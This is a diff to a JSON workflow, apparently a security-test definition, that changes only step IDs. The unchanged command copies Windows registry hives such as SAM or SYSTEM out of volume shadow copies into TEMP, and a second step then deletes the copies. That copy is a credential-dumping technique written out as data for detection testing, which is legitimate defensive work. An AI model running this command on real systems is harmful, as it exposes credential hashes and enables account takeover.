@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "0839800c-19c2-41fa-9842-61b7828cf64c",
+      "id": "66435b77-c44b-4e17-b0cb-3bf6b2d816ee",
       "type": "execute-command",
       "data": {
         "command": "1..#{limit} | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\" , \"$env:TEMP\\#{target_hive}vss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "8210236b-c6f4-4c4f-9043-8d3373c5ac29",
+      "id": "b1d8a606-9822-48c1-9172-9157ee3e80ad",
       "type": "execute-command",
       "data": {
         "command": "1..#{limit} | % {\n  rm \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}\n",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "0839800c-19c2-41fa-9842-61b7828cf64c",
+      "s": "66435b77-c44b-4e17-b0cb-3bf6b2d816ee",
       "p": "on-success",
-      "o": "8210236b-c6f4-4c4f-9043-8d3373c5ac29"
+      "o": "b1d8a606-9822-48c1-9172-9157ee3e80ad"
     },
     {
-      "s": "0839800c-19c2-41fa-9842-61b7828cf64c",
+      "s": "66435b77-c44b-4e17-b0cb-3bf6b2d816ee",
       "p": "on-failure",
-      "o": "8210236b-c6f4-4c4f-9043-8d3373c5ac29"
+      "o": "b1d8a606-9822-48c1-9172-9157ee3e80ad"
     }
   ],
   "tags": [
